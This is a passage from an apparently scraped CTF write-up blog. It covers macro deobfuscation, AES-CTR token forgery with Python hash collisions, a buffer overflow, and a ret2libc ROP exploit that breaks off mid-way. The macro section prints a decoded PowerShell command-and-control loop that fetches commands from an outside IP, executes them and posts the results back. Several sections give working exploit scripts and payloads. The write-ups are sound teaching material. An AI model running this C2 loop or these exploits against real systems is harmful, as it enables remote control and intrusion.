\u0026amp;uxdufnkjlialsyp(\"3131362036352036392037332036352039382031313920363620313037\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373220\") \u0026amp;uxdufnkjlialsyp(\"3130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3438203635\") \u0026amp;uxdufnkjlialsyp(\"203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635\") \u0026amp;uxdufnkjlialsyp(\"203836203635203636\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"37312036352036382031303320363520373620313033203636203732203635203731\") \u0026amp;uxdufnkjlialsyp(\"20383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3732203737203635203735203635203635203130372036352037312038352036352037352031313920363520313037203635203732203733203635203735203831203635\") \u0026amp;uxdufnkjlialsyp(\"20313033203635203637203438\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"36352039372031303320363620\") \u0026amp;uxdufnkjlialsyp(\"3131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"313032\") \u0026amp;uxdufnkjlialsyp(\"20383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520353220363520373220343820363520383320363520363620\") \u0026amp;uxdufnkjlialsyp(\"3835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"373220373320363520383820313139203635203132322036352036382038312036352037382038\") \u0026amp;uxdufnkjlialsyp(\"31203636203533203635203730203536203635203938203831203635203438203635203731203737203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"393920313033203635203131392036352036382038352036352031303220383120\") \u0026amp;uxdufnkjlialsyp(\"3635203631\")) okbzichkqtto =fxnrfzsdxmcvranp End Function  Recognizing patterns We don\u0026rsquo;t actually need to know Visual Basic for Applications (VBA), we only need to find suspicious patterns. For instance, function okbzichkqtto contains a lot of strings that are encoded in hexadecimal format. We can take one of them and decode it:\n$ echo 3734203635203636203132322036352036382034382036352037342031 | xxd -r -p 74 65 66 122 65 68 48 65 74 1  Now we have numbers. Maybe they are ASCII digits, let\u0026rsquo;s have a look:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; ''.join(map(lambda n: chr(int(n)), '74 65 66 122 65 68 48 65 74'.split())) 'JABzAD0AJ'  It does not look very promising\u0026hellip;\nFinding the output Notice that the above example was for a single string. In the huge function, there are a lot of strings being concatenated using + or \u0026amp; operator (which are equal for concatenating strings in VBA).\nActually, if we read again function uxdufnkjlialsyp, it is clear that it is decoding the input string from hexadecimal format. Then, wdysllqkgsbzs transforms the ASCII digits into characters:\nPrivateFunction wdysllqkgsbzs(strBytes) AsString DimaNumbers Dimfxnrfzsdxmcvranp AsString DimiIter fxnrfzsdxmcvranp =\"\" aNumbers =Split(strBytes) ForiIter =LBound(aNumbers) ToUBound(aNumbers) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +Chr(aNumbers(iIter)) Next wdysllqkgsbzs =fxnrfzsdxmcvranp End Function  So, we can adapt the above code in Python easily and find the output of the huge function:\n$ python3 solve.py JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=  This script can be found in here: solve.py.\nFlag Now we recognize the output as Base64-encode data, so let\u0026rsquo;s decode it and find the flag:\n$ python3 solve.py | base64 -d $s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05} $ python3 solve.py | base64 -d | tr -d \\\\0 | grep -oE 'HTB{.*?}' HTB{5up3r_345y_m4cr05}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/halloween-invitation/","section":"ctf","summary":"Microsoft Office VBA macros deobfuscation","time":18,"title":"Halloween Invitation"},{"contents":"We are given a Python source code that asks to sign in and offers some functionalities. This is the main function:\ndefchallenge(req): fnames=initializeDatabase() file_record['admin'] =[fnameforfnameinfnames] req.sendall(b'Super secret file server for malicious operations.\\n'+ b'Who are you:\\n'+b'\u0026gt; ') user=req.recv(4096).decode().strip() ifuser=='admin': req.sendall( b'Administrator can access the server only via ssh.\\nGoodbye!\\n') return token=json.dumps({'username': user, 'timestamp': str(time.time())}) file_record[user] =[] key=os.urandom(16) iv, token_ct=encrypt(key, token.encode()) req.sendall(b'Your token is: '+token_ct.encode() +b'\\n') whileTrue: req.sendall( b'1. Upload a file.\\n2. Available files.\\n3. Download a file.\\n') req.sendall(b'\u0026gt; ') option=req.recv(4096).decode().strip() try: ifoption=='1': req.sendall(b'Submit your token, passphrase, and file.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) iftoken['username'] notinfile_record.keys(): file_record[token['username']] =[] dt=bytes.fromhex(res['data']) passphrase=res['passphrase'] fname=uploadFile(dt, passphrase) file_record[token['username']].append(fname) payload=json.dumps({'success': True}) req.sendall(payload.encode() +b'\\n') elifoption=='2': req.sendall(b'Submit your token.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) iftoken['username'] notinfile_record.keys(): payload=json.dumps({'files': []}) else: files=file_record[token['username']] payload=json.dumps({'files': files}) req.sendall(payload.encode() +b'\\n') elifoption=='3': req.sendall(b'Submit your token and passphrase.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) passphrase=res['passphrase'] fname=getFname(passphrase) files=file_record[token['username']] iffnamenotinfiles: payload=json.dumps({'filename': fname, 'success': False}) else: content=readFile(fname).hex() payload=json.dumps({ 'filename': fname, 'success': True, 'content': content }) req.sendall(payload.encode() +b'\\n') else: req.sendall(b'Wrong option.') exceptExceptionase: req.sendall(b'An error has occured. Please try again.\\n'+str(e).encode())  First of all, there\u0026rsquo;s a user called admin that has some files:\ndefinitializeDatabase(): fnames=[] directory=\"./uploads/\" forfileinos.listdir(directory): file=directory+file withopen(file, \"rb\") asf: data=f.read() fname=uploadFile(data, os.urandom(100)) os.rename(file, directory+fname) fnames.append(fname) returnfnames  And we cannot sign up directly as admin. After authenticating, we will be given an encrypted JSON token (fields username and timestamp):\n$ nc 178.128.169.13 31214 Super secret file server for malicious operations. Who are you: \u0026gt; rocky Your token is: 5aaf6404b1d989c8c4cbb7fe535b6f3de7c6233d5b9560b7ff81ef42806a5c7ed46b12c8bd76b65961a35e75731aef95f0418b1c969e6deaa9145722c9e5fde1 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt;  The encryption for this token is AES CTR. Here we have the first vulnerability. This is how AES CTR works:\nSo, the plaintext uses XOR against the bit stream generated by the AES blocks with a given key, IV and counter. Therefore, the bit stream is just the XOR between the ciphertext and the plaintext:\n$$ \\mathrm{ct} = \\mathrm{bs} \\oplus \\mathrm{pt} \\iff \\mathrm{bs} = \\mathrm{ct} \\oplus \\mathrm{pt} $$\nHence, we can easily modify our ciphertext so that it decrypts to having admin as username:\n$$ \\mathrm{ct}\u0026rsquo; = \\mathrm{bs} \\oplus \\mathrm{pt}' $$\nWe can check that we don\u0026rsquo;t have any files yet:\n$ nc 178.128.169.13 31214 ... 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt; 2 Submit your token. {\"token\":\"5aaf6404b1d989c8c4cbb7fe535b6f3de7c6233d5b9560b7ff81ef42806a5c7ed46b12c8bd76b65961a35e75731aef95f0418b1c969e6deaa9145722c9e5fde1\"} {\"files\": []}  Now, let\u0026rsquo;s start a script using pwntools in order to perform the XOR operations. Notice that we know the complete original plaintext (JSON token) but for the timestamp key. We can compute it right before we receive the token (actually it does not matter since there is no checks on this).\ndefmain(): host, port=sys.argv[1].split(':') io=remote(host, int(port)) user='rocky' io.sendlineafter(b'\u0026gt; ', user.encode()) now=str(time.time()) io.recvuntil(b'Your token is: ') token_pt=json.dumps({'username': user, 'timestamp': now}) token_ct=bytes.fromhex(io.recvline().strip().decode()) stream=xor(pad(token_pt.encode(), 16), token_ct) admin_token_pt=json.dumps({'username': 'admin', 'timestamp': now}) admin_token_ct=xor(stream, pad(admin_token_pt.encode(), 16)) io.sendlineafter(b'\u0026gt; ', b'2') io.sendlineafter(b'Submit your token.\\n', json.dumps({'token': admin_token_ct.hex()}).encode()) files=set(json.loads(io.recv().decode())['files']) log.info(f'Files: {files}') io.interactive()  And we are logged in as admin. We have these filenames:\n$ python3 solve.py 178.128.169.13:31214 [+] Opening connection to 178.128.169.13 on port 31214: Done [*] Files: {'960330fe5ba25b', '50c6e8cef3a6f91e', '631bf546a8812a78', 'ff299d2e8e3a7783a7', 'ff6338870dcfeca5de'} [*] Switching to interactive mode 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt; $  There are some function related to this file management:\ndefgetFname(passphrase): tphrase=tuple(passphrase) returnhex(hash(tphrase)).replace('0x', '').replace('-', 'ff') defuploadFile(dt, passphrase): fname=getFname(passphrase) open('./uploads/'+fname, 'wb').write(dt) returnfname defreadFile(fname): returnopen('./uploads/'+fname, 'rb').read()  We would like to use option 3 in order to download all the files and find the flag in some of them. The problem here is that we need to enter a passphrase that will be transformed to tuple and then Python built-in hash function will be applied (in getFname).\nThis hash function returns an 8-byte integer, but it depends a lot on the input types:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(hash('asdf')) '0x62c09052785dadc' \u0026gt;\u0026gt;\u0026gt; hex(hash(b'asdf')) '0x62c09052785dadc' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple('asdf'))) '0x49f23da86a2b619e' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple(b'asdf'))) '-0x49b8b3f6e75ed0ae' \u0026gt;\u0026gt;\u0026gt; hex(hash(1)) '0x1' \u0026gt;\u0026gt;\u0026gt; hex(hash(2)) '0x2' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple({'asdf': 1}))) '-0x13159d01c2f43a76'  For numbers, it is trivial to reverse. Actually, there is a way to reverse the hash function for tuple objects (which is our case). I found the solution in FCSC 2022 - Hash-ish. This article points to the Python codebase where the hash implementation for tuple can be found.\nEventually, I adapted the functions written by the author of the article to our problem. Since we are dealing with JSON documents, we can enter a list and it will be parsed to a Python list, and then transformed to tuple. So we are good to go:\nforfileinfiles: fname=find_collision(file) io.sendlineafter(b'\u0026gt; ', b'3') io.sendlineafter(b'Submit your token and passphrase.\\n', json.dumps({'token': admin_token_ct.hex(), 'passphrase': fname}).encode()) content=bytes.fromhex(json.loads(io.recvline().decode())['content']) ifb'HTB{'incontent: log.success(f'Flag: {content.decode().strip()}') break io.close()  Using this solution script: solve.py we can obtain the flag:\n$ python3 solve.py 178.128.169.13:31214 [+] Opening connection to 178.128.169.13 on port 31214: Done [*] Files: {'ff703746f45528d417', 'ff623150c55cdd9c09', '285f19e8770e0b14', 'ff637b5a6962fc4c3e', '57c39a9fbebb176a'} [+] Flag: HTB{f1nd1n9_2320_d4y5_1n_py7h0n_15_fun} [*] Closed connection to 178.128.169.13 port 31214  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/hash-the-filesystem/","section":"ctf","summary":"AES CTR. Inverse function of the Python built-in hash function","time":4,"title":"Hash the Filesystem"},{"contents":"We are given a 64-bit binary called vulnerable:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments  If we execute the binary, it seems that it does nothing:\n$ ./vulnerable asdf fdsa 1 2  If we insert data from standard input (stdin), we make the program work:\n$ echo asdf | ./vulnerable Hello asdf !  Let\u0026rsquo;s send 100 characters using Python and check if it crashes:\n$ ./vulnerable $(python3 -c 'print(\"A\" * 100)') Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ! zsh: segmentation fault (core dumped)  Great, the binary seems vulnerable to Buffer Overflow.\nUsing a reversing tool as Ghidra, we can decompile the binary and obtain readable C source code. The main function of the program is this one:\nint main(void) { char local_28[32]; memset(local_28, 0, 0x20); read_all_stdin(local_28); if (local_28[0] == '\\0') { puts(\"What is your name?\"); } else { printf(\"Hello %s!\\n\", local_28); } return 0; }  It is calling read_all_stdin:\nvoid read_all_stdin(long param_1) { int iVar1; int local_c; local_c = 0; while (true) { iVar1 = fgetc(stdin); if (iVar1 == -1) break; *(char *) (param_1 + local_c) = (char) iVar1; local_c = local_c + 1; } return; }  The vulnerability is that the variable called local_28 in the main function has 32 bytes assigned as buffer. However, read_all_stdin is reading bytes until our input data ends (no limitation) and adding them to local_c (which is local_28 from main, though Ghidra is not able to decompile it completely).\nAlthough it is not called in the main function, in the binary we can find another function called print_flags:\nvoid print_flags(void) { char *__s; __s = getenv(\"FLAGS\"); puts(__s); /* WARNING: Subroutine does not return */ exit(0); }  This function obviously prints the flag to complete the challenge. So, the aim of the exploit will be to execute this function.\nA Buffer Overflow vulnerability consists of entering enough data to overflow the buffer assigned to a certain variable (in this case, local_28). After the buffer assigned to a variable, there is a critical value that control the execution of the program, that is the saved return address (which will be copied to $rip when returning from a function). Overflowing the buffer grants us potential control over this register.\nThis time we will focus on controlling $rip, which is the Instruction Pointer register. As its name says, it contains the address of the next instruction to execute. Thus, if we overwrite $rip with the address of print_flags, this function will be executed.\nThe address of this function is shown in Ghidra (0x4006ee). However, it can be shown with readelf as well:\n$ readelf -s vulnerable | grep print_flags 59: 00000000004006ee 34 FUNC GLOBAL DEFAULT 13 print_flags  Now we need to have the number of characters needed to control the $rip register, in order to put there the address of print_flags. This can be done with GDB and a pattern string created with cyclic from pwntools (for example, 100 characters):\n$ pwn cyclic 100 | tee pattern aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ gdb -q vulnerable Reading symbols from vulnerable... (No debugging symbols found in vulnerable) gef➤ run 0x0000000000400771 in main ()  Now the program has crashed, we can examine the values of the registers. Since it is a 64-bit binary, $rip is not overwritten (it is kind of protected), so we need to take the value at $rsp (where the next address is saved in order to copy it to $rip):\ngef➤ x $rsp 0x7fffffffe758: 0x6161616b  The value 0x6161616b corresponds with kaaa (little-endian format). We can calculate the offset again with pwntools:\n$ pwn cyclic -l 0x6161616b 40  Therefore, we need to enter 40 characters and then the address of print_flags to redirect code execution. Let\u0026rsquo;s do it from the command line. To avoid unexpected behavior we must set an environment variable called FLAGS (because the binary will try to access it inside print_flags):\n$ export FLAGS=this_will_be_the_flag $ (python3 -c 'import sys; sys.stdout.write(\"A\" * 40)'; echo -e '\\xee\\x06\\x40\\0\\0\\0\\0\\0') | ./vulnerable Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@! this_will_be_the_flag  Nice, now we need to send it to the remote instance. Since the input is taken from a URL query parameter, we need to encode the hexadecimal characters into URL encoding:\n$ curl \"http://35.227.24.107/0f7bd59245/?stdin=$(python3 -c 'import sys; sys.stdout.write(\"A\" * 40)')%ee%06%40%00%00%00%00%00\" \u0026lt;a href=\"vulnerable\"\u0026gt;Download binary\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form\u0026gt;Stdin: \u0026lt;input type=\"text\" name=\"stdin\"\u0026gt; \u0026lt;input type=\"submit\"\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@! [\"^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$\"] \u0026lt;/pre\u0026gt;  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/hello-world/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Redirecting program execution","time":4,"title":"Hello World!"},{"contents":"We are given a 64-bit binary called vuln and a libc.so.6 file as external library:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:\n$ chmod +x vuln $ ./vuln zsh: segmentation fault (core dumped) ./vuln  It is configured to use Glibc at the current directory:\n$ ldd vuln linux-vdso.so.1 (0x00007ffdc3195000) libc.so.6 = ./libc.so.6 (0x00007ff93c204000) /lib64/ld-linux-x86-64.so.2 (0x00007ff93c5f7000)  We will use pwninit to patch the binary so that it works:\n$ pwninit --libc libc.so.6 --no-template --bin vuln bin: vuln libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb setting ./ld-2.27.so executable copying vuln to vuln_patched running patchelf on vuln_patched  And now it works:\n$ ./vuln_patched WeLcOmE To mY EcHo sErVeR! asdf AsDf  The program is just taking user input and transform each letter to alternative uppercase and lowercase. Let\u0026rsquo;s test if it is vulnerable to Buffer Overflow:\n$ python3 -c 'print(\"A\" * 300)' | ./vuln_patched WeLcOmE To mY EcHo sErVeR! AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd zsh: done python3 -c 'print(\"A\" * 300)' | zsh: segmentation fault (core dumped) ./vuln_patched  And it is vulnerable because the program crashes, which means that the return address has been modified. We can use GDB to obtain the exact amount of characters needed to modify the return address:\n$ gdb -q vuln_patched Reading symbols from vuln_patched... (No debugging symbols found in vuln_patched) gef➤ pattern create 300 [+] Generating a pattern of 300 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./vuln_patched WeLcOmE To mY EcHo sErVeR! aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa AaAaAaAaBaAaAaAaCaAaAaAaDaAaAaAaEaAaAaAaFaAaAaAaGaAaAaAaHaAaAaAaIaAaAaAaJaAaAaAaKaAaAaAaLaAaAaAaMaAaaaaanaaaaaaaoaaaaaaad Program received signal SIGSEGV, Segmentation fault. 0x0000000000400770 in do_stuff ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 136 (little-endian search) likely [+] Found at offset 129 (big-endian search)  We see that we need 136 characters before modifying the $rsp register (where the return address is saved before a function call).\nSince the binary has NX protection, we must use Return Oriented Programming (ROP) to exploit the vulnerability. Moreover, we will need to bypass ASLR because it is very likely that it will be enabled on the remote instance.\nIn order to bypass ASLR, we need to leak an address within Glibc at runtime, so that we can compute the base address of the library and calculate the real address of system and \u0026quot;/bin/sh\u0026quot; (this technique is called Ret2Libc).\nSince we have a Buffer Overflow, we control the next address that will be executed. Hence, we can call a function like puts to print the address of another function. To call puts, we need to use the address of puts at the Procedure Linkage Table (PLT). This function prints the first argument as a string (so it prints the contents of a given address until a null byte). Therefore, the argument for puts will be the address of a function inside the Global Offset Table (GOT), which contains the real address of the given function if it has already been resolved.\nBecause of the calling conventions for 64-bit binaries, we need to put the first argument in $rdi register before calling a function.\nIn order to do that, we will use gadgets. These are sequences of assembly instructions that end in ret, so that whenever they are executed, we return to the stack, where we have the next gadget or function call. That\u0026rsquo;s why it is called ROP, because we are executing code from specific addresses found on the binary and returning to the next one. The sequence of gadgets employed for the exploitation is usually known as ROP chain and it allows us to bypass NX.\nLet\u0026rsquo;s find all the information needed for exploitation:\n$ objdump -d vuln | grep puts 0000000000400540 \u0026lt;puts@plt\u0026gt;: 400540: ff 25 d2 0a 20 00 jmpq *0x200ad2(%rip) # 601018 \u0026lt;puts@GLIBC_2.2.5\u0026gt; 400769: e8 d2 fd ff ff callq 400540 \u0026lt;puts@plt\u0026gt; 400891: e8 aa fc ff ff callq 400540 \u0026lt;puts@plt\u0026gt;  Here we have puts at PLT (0x400540) and puts at GOT (0x601018). The GOT address for puts can also be obtained with readelf and with another flag of objdump:\n$ objdump -R vuln | grep puts 0000000000601018 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5 $ readelf -r vuln | grep puts 000000601018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0  Now we need to find a gadget to put the address of puts at the GOT in $rdi. One useful gadget will be pop rdi; ret, which takes a value from the stack and stores it in $rdi. Let\u0026rsquo;s search it using ROPgadget:\n$ ROPgadget --binary vuln | grep 'pop rdi ; ret' 0x0000000000400913 : pop rdi ; ret  One last thing is the address of main. This is needed for the last function to call in the ROP chain, so that we restart the program without closing the process:\n$ readelf -s vuln | grep main$ 63: 0000000000400771 305 FUNC GLOBAL DEFAULT 13 main  We can create this Python script to exploit the binary:\n#!/usr/bin/env python3 from pwn import * context.binary = elf = ELF('vuln_patched') glibc = ELF('libc.so.6', checksec=False) def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() offset = 136 junk = b'A' * offset pop_rdi_ret = 0x400913 puts_got = 0x601018 puts_plt = 0x400540 main_addr = 0x400771 payload = junk payload += p64(pop_rdi_ret) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive() if __name__ == '__main__': main()  If we run it, we will get the leaked puts address at runtime and also main is executed again:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 143772 [*] Switching to interactive mode 0\\x1a\\x90\\xa6\\x7f WeLcOmE To mY EcHo sErVeR! $  In order to compute the base address of Glibc at runtime, we need to substract the offset of puts inside Glibc to its address at runtime. The offset for puts is 0x80a30:\n$ readelf -s libc.so.6 | grep ' puts$' 7481: 0000000000080a30 512 FUNC WEAK DEFAULT 13 puts  We can update the exploit to show that information:\nputs_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x80a30 glibc_base_addr = puts_addr - puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}')  And now we show the information when the exploit is executed:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 148874 [*] Leaked puts() address: 0x7fa62ed48a30 [*] Glibc base address: 0x7fa62ecc8000 [*] Switching to interactive mode WeLcOmE To mY EcHo sErVeR! $  This is useful because if the base address of Glibc does not end in 000 in hexadecimal, it is likely that something is not working as expected. The randomization process of ASLR usually generates numbers that end in 000, so it is also a sanity check during exploitation.\nNow it is time to call system using \u0026quot;/bin/sh\u0026quot; as argument (again, we need to use pop rdi; ret as gadget to set the pointer to \u0026quot;/bin/sh\u0026quot; as an argument for system).\nThe needed information is here:\n$ readelf -s libc.so.6 | grep ' system$' 6032: 000000000004f4e0 45 FUNC WEAK DEFAULT 13 system $ strings -atx libc.so.6 | grep /bin/sh 1b40fa /bin/sh  Now we continue with a second ROP chain to spawn a shell:\nsystem_offset = 0x4f4e0 bin_sh_offset = 0x1b40fa system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload = junk payload += p64(pop_rdi_ret) payload += p64(bin_sh_addr) payload += p64(system_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive()  But if we run it, we get don\u0026rsquo;t get a shell\u0026hellip;\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 157202 [*] Leaked puts() address: 0x7f394d102a30 [*] Glibc base address: 0x7f394d082000 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  This happens because of stack alignment. At the moment of calling system, the stack is not aligned and it crashes. The solution is to put a simple ret gadget before calling system.\nSince we have already pop rdi; ret at 0x400913, we know that ret will be at 0x400914 (one unit more). We could have used ROPgadget as well.\npayload = junk payload += p64(pop_rdi_ret) payload += p64(bin_sh_addr) payload += p64(pop_rdi_ret + 1) payload += p64(system_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive()  Now we have a shell 